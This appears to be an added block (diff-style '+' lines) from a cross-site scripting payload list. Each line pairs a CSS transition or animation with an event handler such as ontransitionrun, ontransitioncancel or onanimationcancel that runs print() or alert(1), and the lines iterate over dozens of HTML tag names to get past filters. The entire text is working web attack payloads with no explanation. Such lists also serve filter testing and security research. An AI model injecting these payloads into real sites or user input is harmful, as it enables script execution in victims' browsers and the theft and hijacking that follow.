+<style>:target {color: red;}</style><style id=x style="transition:color 10s" ontransitioncancel=print()></style>
+<style>:target {color: red;}</style><sub id=x style="transition:color 10s" ontransitioncancel=print()></sub>
+<style>:target {color: red;}</style><summary id=x style="transition:color 10s" ontransitioncancel=print()></summary>
+<style>:target {color: red;}</style><sup id=x style="transition:color 10s" ontransitioncancel=print()></sup>
+<style>:target {color: red;}</style><svg id=x style="transition:color 10s" ontransitioncancel=print()></svg>
+<style>:target {color: red;}</style><table id=x style="transition:color 10s" ontransitioncancel=print()></table>
+<style>:target {color: red;}</style><tbody id=x style="transition:color 10s" ontransitioncancel=print()></tbody>
+<style>:target {color: red;}</style><td id=x style="transition:color 10s" ontransitioncancel=print()></td>
+<style>:target {color: red;}</style><template id=x style="transition:color 10s" ontransitioncancel=print()></template>
+<style>:target {color: red;}</style><textarea id=x style="transition:color 10s" ontransitioncancel=print()></textarea>
+<style>:target {color: red;}</style><tfoot id=x style="transition:color 10s" ontransitioncancel=print()></tfoot>
+<style>:target {color: red;}</style><th id=x style="transition:color 10s" ontransitioncancel=print()></th>
+<style>:target {color: red;}</style><thead id=x style="transition:color 10s" ontransitioncancel=print()></thead>
+<style>:target {color: red;}</style><time id=x style="transition:color 10s" ontransitioncancel=print()></time>
+<style>:target {color: red;}</style><title id=x style="transition:color 10s" ontransitioncancel=print()></title>
+<style>:target {color: red;}</style><tr id=x style="transition:color 10s" ontransitioncancel=print()></tr>
+<style>:target {color: red;}</style><track id=x style="transition:color 10s" ontransitioncancel=print()></track>
+<style>:target {color: red;}</style><tt id=x style="transition:color 10s" ontransitioncancel=print()></tt>
+<style>:target {color: red;}</style><u id=x style="transition:color 10s" ontransitioncancel=print()></u>
+<style>:target {color: red;}</style><ul id=x style="transition:color 10s" ontransitioncancel=print()></ul>
+<style>:target {color: red;}</style><var id=x style="transition:color 10s" ontransitioncancel=print()></var>
+<style>:target {color: red;}</style><video id=x style="transition:color 10s" ontransitioncancel=print()></video>
+<style>:target {color: red;}</style><video2 id=x style="transition:color 10s" ontransitioncancel=print()></video2>
+<style>:target {color: red;}</style><wbr id=x style="transition:color 10s" ontransitioncancel=print()></wbr>
+<style>:target {color: red;}</style><xmp id=x style="transition:color 10s" ontransitioncancel=print()></xmp>
+<style>:target {color: red;}</style><xss id=x style="transition:color 10s" ontransitioncancel=print()></xss>
+<style>:target {color:red;}</style><geolocation id=x style="transition:color 1s" ontransitionstart=alert(1)></geolocation>
+<style>:target {color:red;}</style><geolocation id=x style="transition:color 1s" onwebkittransitionend=alert(1)></geolocation>
+<style>:target {transform: rotate(180deg);}</style><a id=x style="transition:transform 2s" ontransitionrun=print()></a>
+<style>:target {transform: rotate(180deg);}</style><a2 id=x style="transition:transform 2s" ontransitionrun=print()></a2>
+<style>:target {transform: rotate(180deg);}</style><abbr id=x style="transition:transform 2s" ontransitionrun=print()></abbr>
+<style>:target {transform: rotate(180deg);}</style><acronym id=x style="transition:transform 2s" ontransitionrun=print()></acronym>
+<style>:target {transform: rotate(180deg);}</style><address id=x style="transition:transform 2s" ontransitionrun=print()></address>
+<style>:target {transform: rotate(180deg);}</style><animate id=x style="transition:transform 2s" ontransitionrun=print()></animate>
+<style>:target {transform: rotate(180deg);}</style><animatemotion id=x style="transition:transform 2s" ontransitionrun=print()></animatemotion>
+<style>:target {transform: rotate(180deg);}</style><animatetransform id=x style="transition:transform 2s" ontransitionrun=print()></animatetransform>
+<style>:target {transform: rotate(180deg);}</style><applet id=x style="transition:transform 2s" ontransitionrun=print()></applet>
+<style>:target {transform: rotate(180deg);}</style><area id=x style="transition:transform 2s" ontransitionrun=print()></area>
+<style>:target {transform: rotate(180deg);}</style><article id=x style="transition:transform 2s" ontransitionrun=print()></article>
+<style>:target {transform: rotate(180deg);}</style><aside id=x style="transition:transform 2s" ontransitionrun=print()></aside>
+<style>:target {transform: rotate(180deg);}</style><audio id=x style="transition:transform 2s" ontransitionrun=print()></audio>
+<style>:target {transform: rotate(180deg);}</style><audio2 id=x style="transition:transform 2s" ontransitionrun=print()></audio2>
+<style>:target {transform: rotate(180deg);}</style><b id=x style="transition:transform 2s" ontransitionrun=print()></b>
+<style>:target {transform: rotate(180deg);}</style><bdi id=x style="transition:transform 2s" ontransitionrun=print()></bdi>
+<style>:target {transform: rotate(180deg);}</style><bdo id=x style="transition:transform 2s" ontransitionrun=print()></bdo>
+<style>:target {transform: rotate(180deg);}</style><big id=x style="transition:transform 2s" ontransitionrun=print()></big>
+<style>:target {transform: rotate(180deg);}</style><blink id=x style="transition:transform 2s" ontransitionrun=print()></blink>
+<style>:target {transform: rotate(180deg);}</style><blockquote id=x style="transition:transform 2s" ontransitionrun=print()></blockquote>
+<style>:target {transform: rotate(180deg);}</style><body id=x style="transition:transform 2s" ontransitionrun=print()></body>
+<style>:target {transform: rotate(180deg);}</style><br id=x style="transition:transform 2s" ontransitionrun=print()></br>
+<style>:target {transform: rotate(180deg);}</style><button id=x style="transition:transform 2s" ontransitionrun=print()></button>
+<style>:target {transform: rotate(180deg);}</style><canvas id=x style="transition:transform 2s" ontransitionrun=print()></canvas>
+<style>:target {transform: rotate(180deg);}</style><caption id=x style="transition:transform 2s" ontransitionrun=print()></caption>
+<style>:target {transform: rotate(180deg);}</style><center id=x style="transition:transform 2s" ontransitionrun=print()></center>
+<style>:target {transform: rotate(180deg);}</style><cite id=x style="transition:transform 2s" ontransitionrun=print()></cite>
+<style>:target {transform: rotate(180deg);}</style><code id=x style="transition:transform 2s" ontransitionrun=print()></code>
+<style>:target {transform: rotate(180deg);}</style><col id=x style="transition:transform 2s" ontransitionrun=print()></col>
+<style>:target {transform: rotate(180deg);}</style><colgroup id=x style="transition:transform 2s" ontransitionrun=print()></colgroup>
+<style>:target {transform: rotate(180deg);}</style><command id=x style="transition:transform 2s" ontransitionrun=print()></command>
+<style>:target {transform: rotate(180deg);}</style><content id=x style="transition:transform 2s" ontransitionrun=print()></content>
+<style>:target {transform: rotate(180deg);}</style><data id=x style="transition:transform 2s" ontransitionrun=print()></data>
+<style>:target {transform: rotate(180deg);}</style><datalist id=x style="transition:transform 2s" ontransitionrun=print()></datalist>
+<style>:target {transform: rotate(180deg);}</style><dd id=x style="transition:transform 2s" ontransitionrun=print()></dd>
+<style>:target {transform: rotate(180deg);}</style><del id=x style="transition:transform 2s" ontransitionrun=print()></del>
+<style>:target {transform: rotate(180deg);}</style><details id=x style="transition:transform 2s" ontransitionrun=print()></details>
+<style>:target {transform: rotate(180deg);}</style><dfn id=x style="transition:transform 2s" ontransitionrun=print()></dfn>
+<style>:target {transform: rotate(180deg);}</style><dialog id=x style="transition:transform 2s" ontransitionrun=print()></dialog>
+<style>:target {transform: rotate(180deg);}</style><dir id=x style="transition:transform 2s" ontransitionrun=print()></dir>
+<style>:target {transform: rotate(180deg);}</style><div id=x style="transition:transform 2s" ontransitionrun=print()></div>
+<style>:target {transform: rotate(180deg);}</style><dl id=x style="transition:transform 2s" ontransitionrun=print()></dl>
+<style>:target {transform: rotate(180deg);}</style><dt id=x style="transition:transform 2s" ontransitionrun=print()></dt>
+<style>:target {transform: rotate(180deg);}</style><element id=x style="transition:transform 2s" ontransitionrun=print()></element>
+<style>:target {transform: rotate(180deg);}</style><em id=x style="transition:transform 2s" ontransitionrun=print()></em>
+<style>:target {transform: rotate(180deg);}</style><embed id=x style="transition:transform 2s" ontransitionrun=print()></embed>
+<style>:target {transform: rotate(180deg);}</style><fieldset id=x style="transition:transform 2s" ontransitionrun=print()></fieldset>
+<style>:target {transform: rotate(180deg);}</style><figcaption id=x style="transition:transform 2s" ontransitionrun=print()></figcaption>
+<style>:target {transform: rotate(180deg);}</style><figure id=x style="transition:transform 2s" ontransitionrun=print()></figure>
+<style>:target {transform: rotate(180deg);}</style><font id=x style="transition:transform 2s" ontransitionrun=print()></font>
+<style>:target {transform: rotate(180deg);}</style><footer id=x style="transition:transform 2s" ontransitionrun=print()></footer>
+<style>:target {transform: rotate(180deg);}</style><form id=x style="transition:transform 2s" ontransitionrun=print()></form>
+<style>:target {transform: rotate(180deg);}</style><frame id=x style="transition:transform 2s" ontransitionrun=print()></frame>
+<style>:target {transform: rotate(180deg);}</style><frameset id=x style="transition:transform 2s" ontransitionrun=print()></frameset>
+<style>:target {transform: rotate(180deg);}</style><geolocation id=x style="transition:transform 2s" ontransitionrun=print()></geolocation>
+<style>:target {transform: rotate(180deg);}</style><h1 id=x style="transition:transform 2s" ontransitionrun=print()></h1>
+<style>:target {transform: rotate(180deg);}</style><head id=x style="transition:transform 2s" ontransitionrun=print()></head>
+<style>:target {transform: rotate(180deg);}</style><header id=x style="transition:transform 2s" ontransitionrun=print()></header>
+<style>:target {transform: rotate(180deg);}</style><hgroup id=x style="transition:transform 2s" ontransitionrun=print()></hgroup>
+<style>:target {transform: rotate(180deg);}</style><hr id=x style="transition:transform 2s" ontransitionrun=print()></hr>
+<style>:target {transform: rotate(180deg);}</style><html id=x style="transition:transform 2s" ontransitionrun=print()></html>
+<style>:target {transform: rotate(180deg);}</style><i id=x style="transition:transform 2s" ontransitionrun=print()></i>
+<style>:target {transform: rotate(180deg);}</style><iframe id=x style="transition:transform 2s" ontransitionrun=print()></iframe>
+<style>:target {transform: rotate(180deg);}</style><iframe2 id=x style="transition:transform 2s" ontransitionrun=print()></iframe2>
+<style>:target {transform: rotate(180deg);}</style><image id=x style="transition:transform 2s" ontransitionrun=print()></image>
+<style>:target {transform: rotate(180deg);}</style><image2 id=x style="transition:transform 2s" ontransitionrun=print()></image2>
+<style>:target {transform: rotate(180deg);}</style><image3 id=x style="transition:transform 2s" ontransitionrun=print()></image3>
+<style>:target {transform: rotate(180deg);}</style><img id=x style="transition:transform 2s" ontransitionrun=print()></img>
+<style>:target {transform: rotate(180deg);}</style><img2 id=x style="transition:transform 2s" ontransitionrun=print()></img2>
+<style>:target {transform: rotate(180deg);}</style><input id=x style="transition:transform 2s" ontransitionrun=print()></input>
+<style>:target {transform: rotate(180deg);}</style><input2 id=x style="transition:transform 2s" ontransitionrun=print()></input2>
+<style>:target {transform: rotate(180deg);}</style><input3 id=x style="transition:transform 2s" ontransitionrun=print()></input3>
+<style>:target {transform: rotate(180deg);}</style><input4 id=x style="transition:transform 2s" ontransitionrun=print()></input4>
+<style>:target {transform: rotate(180deg);}</style><ins id=x style="transition:transform 2s" ontransitionrun=print()></ins>
+<style>:target {transform: rotate(180deg);}</style><kbd id=x style="transition:transform 2s" ontransitionrun=print()></kbd>
+<style>:target {transform: rotate(180deg);}</style><keygen id=x style="transition:transform 2s" ontransitionrun=print()></keygen>
+<style>:target {transform: rotate(180deg);}</style><label id=x style="transition:transform 2s" ontransitionrun=print()></label>
+<style>:target {transform: rotate(180deg);}</style><legend id=x style="transition:transform 2s" ontransitionrun=print()></legend>
+<style>:target {transform: rotate(180deg);}</style><li id=x style="transition:transform 2s" ontransitionrun=print()></li>
+<style>:target {transform: rotate(180deg);}</style><link id=x style="transition:transform 2s" ontransitionrun=print()></link>
+<style>:target {transform: rotate(180deg);}</style><listing id=x style="transition:transform 2s" ontransitionrun=print()></listing>
+<style>:target {transform: rotate(180deg);}</style><main id=x style="transition:transform 2s" ontransitionrun=print()></main>
+<style>:target {transform: rotate(180deg);}</style><map id=x style="transition:transform 2s" ontransitionrun=print()></map>
+<style>:target {transform: rotate(180deg);}</style><mark id=x style="transition:transform 2s" ontransitionrun=print()></mark>
+<style>:target {transform: rotate(180deg);}</style><marquee id=x style="transition:transform 2s" ontransitionrun=print()></marquee>
+<style>:target {transform: rotate(180deg);}</style><menu id=x style="transition:transform 2s" ontransitionrun=print()></menu>
+<style>:target {transform: rotate(180deg);}</style><menuitem id=x style="transition:transform 2s" ontransitionrun=print()></menuitem>
+<style>:target {transform: rotate(180deg);}</style><meta id=x style="transition:transform 2s" ontransitionrun=print()></meta>
+<style>:target {transform: rotate(180deg);}</style><meter id=x style="transition:transform 2s" ontransitionrun=print()></meter>
+<style>:target {transform: rotate(180deg);}</style><multicol id=x style="transition:transform 2s" ontransitionrun=print()></multicol>
+<style>:target {transform: rotate(180deg);}</style><nav id=x style="transition:transform 2s" ontransitionrun=print()></nav>
+<style>:target {transform: rotate(180deg);}</style><nextid id=x style="transition:transform 2s" ontransitionrun=print()></nextid>
+<style>:target {transform: rotate(180deg);}</style><nobr id=x style="transition:transform 2s" ontransitionrun=print()></nobr>
+<style>:target {transform: rotate(180deg);}</style><noembed id=x style="transition:transform 2s" ontransitionrun=print()></noembed>
+<style>:target {transform: rotate(180deg);}</style><noframes id=x style="transition:transform 2s" ontransitionrun=print()></noframes>
+<style>:target {transform: rotate(180deg);}</style><noscript id=x style="transition:transform 2s" ontransitionrun=print()></noscript>
+<style>:target {transform: rotate(180deg);}</style><object id=x style="transition:transform 2s" ontransitionrun=print()></object>
+<style>:target {transform: rotate(180deg);}</style><ol id=x style="transition:transform 2s" ontransitionrun=print()></ol>
+<style>:target {transform: rotate(180deg);}</style><optgroup id=x style="transition:transform 2s" ontransitionrun=print()></optgroup>
+<style>:target {transform: rotate(180deg);}</style><option id=x style="transition:transform 2s" ontransitionrun=print()></option>
+<style>:target {transform: rotate(180deg);}</style><output id=x style="transition:transform 2s" ontransitionrun=print()></output>
+<style>:target {transform: rotate(180deg);}</style><p id=x style="transition:transform 2s" ontransitionrun=print()></p>
+<style>:target {transform: rotate(180deg);}</style><param id=x style="transition:transform 2s" ontransitionrun=print()></param>
+<style>:target {transform: rotate(180deg);}</style><picture id=x style="transition:transform 2s" ontransitionrun=print()></picture>
+<style>:target {transform: rotate(180deg);}</style><plaintext id=x style="transition:transform 2s" ontransitionrun=print()></plaintext>
+<style>:target {transform: rotate(180deg);}</style><pre id=x style="transition:transform 2s" ontransitionrun=print()></pre>
+<style>:target {transform: rotate(180deg);}</style><progress id=x style="transition:transform 2s" ontransitionrun=print()></progress>
+<style>:target {transform: rotate(180deg);}</style><q id=x style="transition:transform 2s" ontransitionrun=print()></q>
+<style>:target {transform: rotate(180deg);}</style><rb id=x style="transition:transform 2s" ontransitionrun=print()></rb>
+<style>:target {transform: rotate(180deg);}</style><rp id=x style="transition:transform 2s" ontransitionrun=print()></rp>
+<style>:target {transform: rotate(180deg);}</style><rt id=x style="transition:transform 2s" ontransitionrun=print()></rt>
+<style>:target {transform: rotate(180deg);}</style><rtc id=x style="transition:transform 2s" ontransitionrun=print()></rtc>
+<style>:target {transform: rotate(180deg);}</style><ruby id=x style="transition:transform 2s" ontransitionrun=print()></ruby>
+<style>:target {transform: rotate(180deg);}</style><s id=x style="transition:transform 2s" ontransitionrun=print()></s>
+<style>:target {transform: rotate(180deg);}</style><samp id=x style="transition:transform 2s" ontransitionrun=print()></samp>
+<style>:target {transform: rotate(180deg);}</style><script id=x style="transition:transform 2s" ontransitionrun=print()></script>
+<style>:target {transform: rotate(180deg);}</style><section id=x style="transition:transform 2s" ontransitionrun=print()></section>
+<style>:target {transform: rotate(180deg);}</style><select id=x style="transition:transform 2s" ontransitionrun=print()></select>
+<style>:target {transform: rotate(180deg);}</style><set id=x style="transition:transform 2s" ontransitionrun=print()></set>
+<style>:target {transform: rotate(180deg);}</style><shadow id=x style="transition:transform 2s" ontransitionrun=print()></shadow>
+<style>:target {transform: rotate(180deg);}</style><slot id=x style="transition:transform 2s" ontransitionrun=print()></slot>
+<style>:target {transform: rotate(180deg);}</style><small id=x style="transition:transform 2s" ontransitionrun=print()></small>
+<style>:target {transform: rotate(180deg);}</style><source id=x style="transition:transform 2s" ontransitionrun=print()></source>
+<style>:target {transform: rotate(180deg);}</style><spacer id=x style="transition:transform 2s" ontransitionrun=print()></spacer>
+<style>:target {transform: rotate(180deg);}</style><span id=x style="transition:transform 2s" ontransitionrun=print()></span>
+<style>:target {transform: rotate(180deg);}</style><strike id=x style="transition:transform 2s" ontransitionrun=print()></strike>
+<style>:target {transform: rotate(180deg);}</style><strong id=x style="transition:transform 2s" ontransitionrun=print()></strong>
+<style>:target {transform: rotate(180deg);}</style><style id=x style="transition:transform 2s" ontransitionrun=print()></style>
+<style>:target {transform: rotate(180deg);}</style><sub id=x style="transition:transform 2s" ontransitionrun=print()></sub>
+<style>:target {transform: rotate(180deg);}</style><summary id=x style="transition:transform 2s" ontransitionrun=print()></summary>
+<style>:target {transform: rotate(180deg);}</style><sup id=x style="transition:transform 2s" ontransitionrun=print()></sup>
+<style>:target {transform: rotate(180deg);}</style><svg id=x style="transition:transform 2s" ontransitionrun=print()></svg>
+<style>:target {transform: rotate(180deg);}</style><table id=x style="transition:transform 2s" ontransitionrun=print()></table>
+<style>:target {transform: rotate(180deg);}</style><tbody id=x style="transition:transform 2s" ontransitionrun=print()></tbody>
+<style>:target {transform: rotate(180deg);}</style><td id=x style="transition:transform 2s" ontransitionrun=print()></td>
+<style>:target {transform: rotate(180deg);}</style><template id=x style="transition:transform 2s" ontransitionrun=print()></template>
+<style>:target {transform: rotate(180deg);}</style><textarea id=x style="transition:transform 2s" ontransitionrun=print()></textarea>
+<style>:target {transform: rotate(180deg);}</style><tfoot id=x style="transition:transform 2s" ontransitionrun=print()></tfoot>
+<style>:target {transform: rotate(180deg);}</style><th id=x style="transition:transform 2s" ontransitionrun=print()></th>
+<style>:target {transform: rotate(180deg);}</style><thead id=x style="transition:transform 2s" ontransitionrun=print()></thead>
+<style>:target {transform: rotate(180deg);}</style><time id=x style="transition:transform 2s" ontransitionrun=print()></time>
+<style>:target {transform: rotate(180deg);}</style><title id=x style="transition:transform 2s" ontransitionrun=print()></title>
+<style>:target {transform: rotate(180deg);}</style><tr id=x style="transition:transform 2s" ontransitionrun=print()></tr>
+<style>:target {transform: rotate(180deg);}</style><track id=x style="transition:transform 2s" ontransitionrun=print()></track>
+<style>:target {transform: rotate(180deg);}</style><tt id=x style="transition:transform 2s" ontransitionrun=print()></tt>
+<style>:target {transform: rotate(180deg);}</style><u id=x style="transition:transform 2s" ontransitionrun=print()></u>
+<style>:target {transform: rotate(180deg);}</style><ul id=x style="transition:transform 2s" ontransitionrun=print()></ul>
+<style>:target {transform: rotate(180deg);}</style><var id=x style="transition:transform 2s" ontransitionrun=print()></var>
+<style>:target {transform: rotate(180deg);}</style><video id=x style="transition:transform 2s" ontransitionrun=print()></video>
+<style>:target {transform: rotate(180deg);}</style><video2 id=x style="transition:transform 2s" ontransitionrun=print()></video2>
+<style>:target {transform: rotate(180deg);}</style><wbr id=x style="transition:transform 2s" ontransitionrun=print()></wbr>
+<style>:target {transform: rotate(180deg);}</style><xmp id=x style="transition:transform 2s" ontransitionrun=print()></xmp>
+<style>:target {transform: rotate(180deg);}</style><xss id=x style="transition:transform 2s" ontransitionrun=print()></xss>
+<style>@keyframes slidein {}</style><geolocation style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></geolocation>
+<style>@keyframes slidein {}</style><geolocation style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onwebkitanimationiteration="alert(1)"></geolocation>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><a id=x style="position:absolute;" onanimationcancel="print()"></a>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><a2 id=x style="position:absolute;" onanimationcancel="print()"></a2>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><abbr id=x style="position:absolute;" onanimationcancel="print()"></abbr>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><acronym id=x style="position:absolute;" onanimationcancel="print()"></acronym>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><address id=x style="position:absolute;" onanimationcancel="print()"></address>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><animate id=x style="position:absolute;" onanimationcancel="print()"></animate>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><animatemotion id=x style="position:absolute;" onanimationcancel="print()"></animatemotion>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><animatetransform id=x style="position:absolute;" onanimationcancel="print()"></animatetransform>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><applet id=x style="position:absolute;" onanimationcancel="print()"></applet>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><area id=x style="position:absolute;" onanimationcancel="print()"></area>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><article id=x style="position:absolute;" onanimationcancel="print()"></article>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><aside id=x style="position:absolute;" onanimationcancel="print()"></aside>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><audio id=x style="position:absolute;" onanimationcancel="print()"></audio>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><audio2 id=x style="position:absolute;" onanimationcancel="print()"></audio2>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><b id=x style="position:absolute;" onanimationcancel="print()"></b>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><bdi id=x style="position:absolute;" onanimationcancel="print()"></bdi>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><bdo id=x style="position:absolute;" onanimationcancel="print()"></bdo>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><big id=x style="position:absolute;" onanimationcancel="print()"></big>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><blink id=x style="position:absolute;" onanimationcancel="print()"></blink>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><blockquote id=x style="position:absolute;" onanimationcancel="print()"></blockquote>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><body id=x style="position:absolute;" onanimationcancel="print()"></body>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><br id=x style="position:absolute;" onanimationcancel="print()"></br>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><button id=x style="position:absolute;" onanimationcancel="print()"></button>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><canvas id=x style="position:absolute;" onanimationcancel="print()"></canvas>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><caption id=x style="position:absolute;" onanimationcancel="print()"></caption>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><center id=x style="position:absolute;" onanimationcancel="print()"></center>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><cite id=x style="position:absolute;" onanimationcancel="print()"></cite>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><code id=x style="position:absolute;" onanimationcancel="print()"></code>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><col id=x style="position:absolute;" onanimationcancel="print()"></col>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><colgroup id=x style="position:absolute;" onanimationcancel="print()"></colgroup>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><command id=x style="position:absolute;" onanimationcancel="print()"></command>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><content id=x style="position:absolute;" onanimationcancel="print()"></content>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><data id=x style="position:absolute;" onanimationcancel="print()"></data>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><datalist id=x style="position:absolute;" onanimationcancel="print()"></datalist>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dd id=x style="position:absolute;" onanimationcancel="print()"></dd>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><del id=x style="position:absolute;" onanimationcancel="print()"></del>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><details id=x style="position:absolute;" onanimationcancel="print()"></details>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dfn id=x style="position:absolute;" onanimationcancel="print()"></dfn>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dialog id=x style="position:absolute;" onanimationcancel="print()"></dialog>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dir id=x style="position:absolute;" onanimationcancel="print()"></dir>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><div id=x style="position:absolute;" onanimationcancel="print()"></div>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dl id=x style="position:absolute;" onanimationcancel="print()"></dl>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dt id=x style="position:absolute;" onanimationcancel="print()"></dt>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><element id=x style="position:absolute;" onanimationcancel="print()"></element>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><em id=x style="position:absolute;" onanimationcancel="print()"></em>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><embed id=x style="position:absolute;" onanimationcancel="print()"></embed>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><fieldset id=x style="position:absolute;" onanimationcancel="print()"></fieldset>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><figcaption id=x style="position:absolute;" onanimationcancel="print()"></figcaption>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><figure id=x style="position:absolute;" onanimationcancel="print()"></figure>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><font id=x style="position:absolute;" onanimationcancel="print()"></font>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><footer id=x style="position:absolute;" onanimationcancel="print()"></footer>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><form id=x style="position:absolute;" onanimationcancel="print()"></form>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><frame id=x style="position:absolute;" onanimationcancel="print()"></frame>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><frameset id=x style="position:absolute;" onanimationcancel="print()"></frameset>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><geolocation id=x style="position:absolute;" onanimationcancel="print()"></geolocation>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><h1 id=x style="position:absolute;" onanimationcancel="print()"></h1>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><head id=x style="position:absolute;" onanimationcancel="print()"></head>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><header id=x style="position:absolute;" onanimationcancel="print()"></header>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><hgroup id=x style="position:absolute;" onanimationcancel="print()"></hgroup>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><hr id=x style="position:absolute;" onanimationcancel="print()"></hr>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><html id=x style="position:absolute;" onanimationcancel="print()"></html>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><i id=x style="position:absolute;" onanimationcancel="print()"></i>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><iframe id=x style="position:absolute;" onanimationcancel="print()"></iframe>
